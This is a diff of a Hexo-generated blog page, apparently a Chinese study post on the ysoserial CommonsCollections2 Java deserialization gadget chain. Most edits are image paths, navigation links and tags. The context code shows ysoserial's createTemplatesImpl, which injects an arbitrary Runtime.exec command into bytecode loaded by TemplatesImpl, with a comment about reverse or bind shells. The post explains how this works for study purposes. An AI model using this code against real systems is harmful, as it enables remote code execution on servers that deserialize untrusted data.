@@ -15,16 +15,16 @@
 <meta property="og:site_name" content="Hexo">
 <meta property="og:description" content="前言CommonCollections系列的gadgets之CommonsCollections2 实验环境:jdk1.8.0_211 、org.apache.commons:commons-collections4:4.0">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="http://example.com/2021/05/01/ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BCommonsCollections2/学习总结/blog/source_posts/ysoserial学习之CommonsCollections2/image-20201010152313060.png">
-<meta property="og:image" content="http://example.com/2021/05/01/ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BCommonsCollections2/学习总结/blog/source_posts/ysoserial学习之CommonsCollections2/image-20201010152350210.png">
-<meta property="og:image" content="http://example.com/2021/05/01/ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BCommonsCollections2/学习总结/blog/source_posts/ysoserial学习之CommonsCollections2/image-20201010152845375.png">
+<meta property="og:image" content="http://example.com/2021/05/01/ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BCommonsCollections2/image-20201010152313060.png">
+<meta property="og:image" content="http://example.com/2021/05/01/ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BCommonsCollections2/image-20201010152350210.png">
+<meta property="og:image" content="http://example.com/2021/05/01/ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BCommonsCollections2/image-20201010152845375.png">
 <meta property="og:image" content="http://example.com/2021/05/01/ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BCommonsCollections2/image-20201010153642774.png">
 <meta property="article:published_time" content="2021-05-01T07:55:00.000Z">
-<meta property="article:modified_time" content="2021-05-01T07:55:34.182Z">
+<meta property="article:modified_time" content="2021-05-01T07:59:15.833Z">
 <meta property="article:author" content="John Doe">
 <meta property="article:tag" content="ysoserial学习">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://example.com/2021/05/01/ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BCommonsCollections2/学习总结/blog/source_posts/ysoserial学习之CommonsCollections2/image-20201010152313060.png">
+<meta name="twitter:image" content="http://example.com/2021/05/01/ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BCommonsCollections2/image-20201010152313060.png">
   
     <link rel="alternative" href="/atom.xml" title="Hexo" type="application/atom+xml">
   
@@ -197,11 +197,11 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">public static &lt;T&gt; T createTemplatesImpl ( final String command, Class&lt;T&gt; tplClass, Class&lt;?&gt; abstTranslet, Class&lt;?&gt; transFactory )</span><br><span class="line">           throws Exception &#123;</span><br><span class="line">       final T templates &#x3D; tplClass.newInstance();</span><br><span class="line"></span><br><span class="line">       &#x2F;&#x2F; use template gadget class</span><br><span class="line">       ClassPool pool &#x3D; ClassPool.getDefault();</span><br><span class="line">       pool.insertClassPath(new ClassClassPath(StubTransletPayload.class));</span><br><span class="line">       pool.insertClassPath(new ClassClassPath(abstTranslet));</span><br><span class="line">       final CtClass clazz &#x3D; pool.get(StubTransletPayload.class.getName());</span><br><span class="line">       &#x2F;&#x2F; run command in static initializer</span><br><span class="line">       &#x2F;&#x2F; TODO: could also do fun things like injecting a pure-java rev&#x2F;bind-shell to bypass naive protections</span><br><span class="line">       String cmd &#x3D; &quot;java.lang.Runtime.getRuntime().exec(\&quot;&quot; +</span><br><span class="line">           command.replaceAll(&quot;\\\\&quot;,&quot;\\\\\\\\&quot;).replaceAll(&quot;\&quot;&quot;, &quot;\\\&quot;&quot;) +</span><br><span class="line">           &quot;\&quot;);&quot;;</span><br><span class="line">       clazz.makeClassInitializer().insertAfter(cmd);</span><br><span class="line">       &#x2F;&#x2F; sortarandom name to allow repeated exploitation (watch out for PermGen exhaustion)</span><br><span class="line">       clazz.setName(&quot;ysoserial.Pwner&quot; + System.nanoTime());</span><br><span class="line">       CtClass superC &#x3D; pool.get(abstTranslet.getName());</span><br><span class="line">       clazz.setSuperclass(superC);</span><br><span class="line"></span><br><span class="line">       final byte[] classBytes &#x3D; clazz.toBytecode();</span><br><span class="line"></span><br><span class="line">       &#x2F;&#x2F; inject class bytes into instance</span><br><span class="line">       Reflections.setFieldValue(templates, &quot;_bytecodes&quot;, new byte[][] &#123;</span><br><span class="line">           classBytes, ClassFiles.classAsBytes(Foo.class)</span><br><span class="line">       &#125;);</span><br><span class="line"></span><br><span class="line">       &#x2F;&#x2F; required to make TemplatesImpl happy</span><br><span class="line">       Reflections.setFieldValue(templates, &quot;_name&quot;, &quot;Pwnr&quot;);</span><br><span class="line">       Reflections.setFieldValue(templates, &quot;_tfactory&quot;, transFactory.newInstance());</span><br><span class="line">       return templates;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
 
 <p>想要理解Gadgets.createTemplatesImpl为何要像上面这样构造就需要了解com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.newTransformer是怎么把任意类初始化的</p>
-<p><img src="/2021/05/01/ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BCommonsCollections2/学习总结\blog\source_posts\ysoserial学习之CommonsCollections2\image-20201010152313060.png"></p>
+<p><img src="/2021/05/01/ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BCommonsCollections2/image-20201010152313060.png"></p>
 <p>进入getTransletInstance()</p>
-<p><img src="/2021/05/01/ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BCommonsCollections2/学习总结\blog\source_posts\ysoserial学习之CommonsCollections2\image-20201010152350210.png"></p>
+<p><img src="/2021/05/01/ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BCommonsCollections2/image-20201010152350210.png"></p>
 <p>首先校验_name是否为空，为空返回null，如果_class为空调用defineTransletClasses()</p>
-<p><img src="/2021/05/01/ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BCommonsCollections2/学习总结\blog\source_posts\ysoserial学习之CommonsCollections2\image-20201010152845375.png"></p>
+<p><img src="/2021/05/01/ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BCommonsCollections2/image-20201010152845375.png"></p>
 <p>截取defineTransletClasses关键部分，可以看到调用defineClass加载_bytecodes二元字节组中的字节并将返回的class保存到_class数组中，然后校验class的父类是否为ABSTRACT_TRANSLET也就是com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet。如果是则把_class数组下标赋给_transletIndex。如果整个defineTransletClasses()运行到最终时_transletIndex&lt;0会抛出错误。</p>
 <p><img src="/2021/05/01/ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BCommonsCollections2/image-20201010153642774.png"></p>
 
@@ -307,6 +307,15 @@
 
   
 <nav id="article-nav">
+  
+    <a href="/2021/05/01/ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BCommonsCollections3/" id="article-nav-newer" class="article-nav-link-wrap">
+      <i class="icon-circle-left"></i>
+      <div class="article-nav-title">
+        
+          ysoserial学习之CommonsCollections3
+        
+      </div>
+    </a>
   
   
     <a href="/2021/05/01/ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BCommonsCollections1/" id="article-nav-older" class="article-nav-link-wrap">
@@ -437,6 +446,30 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color2">ysoserial学习</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">java代码相关</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">golang工具</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">渗透技巧</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">java反序列化</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">java反序列化分析</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">C2相关</a>
               </li>
             
             <div class="clearfix"></div>
